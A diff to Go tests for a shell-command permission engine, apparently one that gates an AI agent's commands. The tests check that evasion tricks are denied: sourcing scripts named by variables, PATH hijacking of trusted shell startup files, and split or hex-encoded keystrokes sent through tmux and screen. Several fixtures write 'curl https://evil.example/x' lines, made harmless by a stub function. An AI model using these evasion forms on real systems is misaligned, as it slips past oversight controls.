@@ -4,6 +4,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 )
@@ -560,7 +561,10 @@ func TestScriptsNamedByAVariableAreReadOrRefused(t *testing.T) {
 		}
 	}
 	write(filepath.Join(ws, "s.sh"), "source $X/x.sh\n")
-	write(filepath.Join(ws, "c", "x.sh"), "curl https://evil.example/x\n")
+	ran := filepath.Join(ws, "ran")
+	// The function stands in for curl when a real shell runs the file.
+	write(filepath.Join(ws, "c", "x.sh"), "curl() { : > '"+ran+"'; }\ncurl https://evil.example/x\n")
+	write(filepath.Join(ws, "export.sh"), "export X=c\n")
 	write(filepath.Join(ws, "ok", "x.sh"), "echo safe\n")
 	newEngine := func(rule string, deny bool) *Engine {
 		e := New(ModeBypass)
@@ -590,6 +594,26 @@ func TestScriptsNamedByAVariableAreReadOrRefused(t *testing.T) {
 			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
 		}
 	}
+	// Past what the variable model follows, no value is known: each of these
+	// sources c/x.sh in real bash.
+	stale := []string{
+		"export X=ok; source ./export.sh; bash s.sh", "X=c eval 'bash s.sh'", "export X=ok; export {X,Y}=c; bash s.sh",
+		`export X=ok; export "X=c"; bash s.sh`, "export X=ok; export 'X'=c; bash s.sh", "export X=ok; BASH_ENV=export.sh bash s.sh",
+		"export X=ok; declare -x X=c; bash s.sh", "f() { export X=c; }; export X=ok; f; bash s.sh",
+		"export X=ok; read X <<< c; export X; bash s.sh",
+	}
+	for _, c := range stale {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+		_ = os.Remove(ran)
+		cmd := exec.Command("bash", "-c", c)
+		cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+		_ = cmd.Run()
+		if _, err := os.Stat(ran); err != nil {
+			t.Errorf("%q: real bash did not source c/x.sh", c)
+		}
+	}
 	a := newEngine("bash(curl *)", false)
 	if res := a.Evaluate("bash", true, args(map[string]string{"command": "bash s.sh"})); res.Decision != Ask {
 		t.Errorf("ask rule only: %s (%s)", res.Decision, res.Reason)
@@ -613,7 +637,9 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 	extra := filepath.Join(home, ".zsh", "extra.zsh")
 	write(rc, "eval \"$(pyenv init -)\"\nsource ~/.zsh/extra.zsh\n")
 	write(extra, "alias ll='ls -l'\n")
-	write(filepath.Join(ws, "bin", "pyenv"), "curl https://evil.example/x\n")
+	ran := filepath.Join(ws, "ran")
+	// The function stands in for curl when a real shell runs it.
+	write(filepath.Join(ws, "bin", "pyenv"), "#!/bin/sh\ncurl() { : > '"+ran+"'; }\ncurl https://evil.example/x\n")
 	e := New(ModeBypass)
 	e.Roots = func() []string { return []string{ws} }
 	e.Cwd = func() string { return ws }
@@ -640,6 +666,30 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 	if res := judge("cd bin && zsh -i -c true"); res.Decision == Allow {
 		t.Errorf("a cd before the shell: allowed on the baseline")
 	}
+	// Anything but the shell started alone turns the baseline off.
+	write(filepath.Join(ws, "env.sh"), "export PATH="+filepath.Join(ws, "bin")+":$PATH\n")
+	for _, c := range []string{
+		"read PATH <<< " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true",
+		"printf -v PATH %s " + filepath.Join(ws, "bin") + "; zsh -i -c true",
+		"source ./env.sh; zsh -i -c true", ". ./env.sh && zsh -i -c true", "BASH_ENV=./env.sh zsh -i -c true",
+		"eval 'PATH=bin'; zsh -i -c true", "true; zsh -i -c true", "zsh -i -c true > out.txt", "env zsh -i -c true",
+	} {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
+		}
+	}
+	// Real zsh started so runs the planted program.
+	if _, err := exec.LookPath("zsh"); err == nil {
+		for _, c := range []string{"read PATH <<< " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true", "source ./env.sh; zsh -i -c true"} {
+			_ = os.Remove(ran)
+			cmd := exec.Command("bash", "-c", c)
+			cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+			_ = cmd.Run()
+			if _, err := os.Stat(ran); err != nil {
+				t.Errorf("%q: real zsh did not run the planted pyenv", c)
+			}
+		}
+	}
 	// What the trusted file sources, edited since: judged.
 	write(extra, "curl https://evil.example/x\n")
 	if res := judge("zsh -i -c true"); res.Decision != Deny {
@@ -663,18 +713,37 @@ func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
 		"tmux new-session -d -s w curl https://evil.example/x":      Deny,
 		"tmux send-keys -t w 'curl https://evil.example/x' Enter":   Deny,
 		"tmux send-keys -t w curl Space https://evil.example/x C-m": Deny,
+		"tmux send-keys -t w cu 'rl https://evil.example/x' Enter":  Deny,
+		"tmux send-keys -t w c u r l Enter":                         Deny,
+		"tmux send-keys -H -t w 63 75 72 6c":                        Deny,
+		"tmux set-buffer 'curl x'; tmux paste-buffer -t w":          Deny,
+		"tmux load-buffer f.txt":                                    Deny,
+		"tmux pipe-pane -t w 'cat'":                                 Deny,
+		"screen -S w -X stuff 'cu'":                                 Deny,
+		"screen -S w -X stuff 'rl x\n'":                             Deny,
+		"screen -S w -X paste .":                                    Deny,
+		"screen -S w -X readbuf":                                    Deny,
+		"screen -S w -X exec ls":                                    Deny,
 		"screen -dm curl https://evil.example/x":                    Deny,
 		"screen -S w -dm curl https://evil.example/x":               Deny,
 		"script -q /dev/null curl https://evil.example/x":           Deny,
 		"unbuffer curl https://evil.example/x":                      Deny,
 		"dtach -c /tmp/s curl https://evil.example/x":               Deny,
-		"ssh localhost":                   Deny,
-		"ssh -p 2222 me@host":             Deny,
-		"expect -c 'spawn zsh; interact'": Deny,
-		"tmux new -d 'make test'":         Allow,
-		"screen -dm make":                 Allow,
-		"ssh host uptime":                 Allow,
-		"doas -s":                         Allow,
+		"ssh localhost":                    Deny,
+		"ssh -p 2222 me@host":              Deny,
+		"expect -c 'spawn zsh; interact'":  Deny,
+		"tmux new -d 'make test'":          Allow,
+		"screen -dm make":                  Allow,
+		"ssh -vp 2222 host":                Deny,
+		"ssh -V":                           Allow,
+		"ssh -G host":                      Allow,
+		"ssh -Q cipher":                    Allow,
+		"ssh -O check host":                Allow,
+		"ssh -N -L 8080:localhost:80 host": Allow,
+		"ssh -T git@github.com":            Allow,
+		"ssh -p 2222 host uptime":          Allow,
+		"ssh host uptime":                  Allow,
+		"doas -s":                          Allow,
 	} {
 		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != want {
 			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
@@ -687,6 +756,26 @@ func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
 	for _, c := range []string{"doas -s", "byobu", "unbuffer bash"} {
 		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
 			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+	}
+	// script's command is read as typed: the shell it names reads its start-up files.
+	ran := filepath.Join(home, "ran")
+	if err := os.WriteFile(filepath.Join(home, ".zshrc"), []byte("curl() { : > '"+ran+"'; }\ncurl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range []string{"script -q /dev/null zsh -i -c true", "script -q /dev/null zsh -i", "script -c 'zsh -i -c true' /dev/null",
+		"script -qF /tmp/p /dev/null zsh -i -c true"} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+	}
+	// On macOS, script runs the command after the file; real zsh reads .zshrc so.
+	if _, err := exec.LookPath("zsh"); err == nil && runtime.GOOS == "darwin" {
+		cmd := exec.Command("script", "-q", "/dev/null", "zsh", "-i", "-c", "true")
+		cmd.Env = []string{"PATH=/usr/bin:/bin", "HOME=" + home, "TERM=dumb"}
+		_ = cmd.Run()
+		if _, err := os.Stat(ran); err != nil {
+			t.Error("script -q /dev/null zsh -i -c true did not read .zshrc")
 		}
 	}
 }
